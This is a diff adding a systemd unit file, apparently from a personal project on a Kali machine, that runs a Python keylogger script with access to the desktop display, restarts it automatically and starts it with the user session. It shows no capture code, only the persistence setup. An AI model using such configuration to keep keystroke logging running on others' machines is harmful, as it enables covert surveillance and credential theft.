@@ -1,0 +1,13 @@
+[Unit]
+Description=My Keylogger Service
+After=network.target
+
+[Service]
+Type=simple
+Environment="DISPLAY=:0"
+ExecStart=/usr/bin/python3 /home/kali/PycharmProjects/KeyloggerProject/main.py
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=default.target
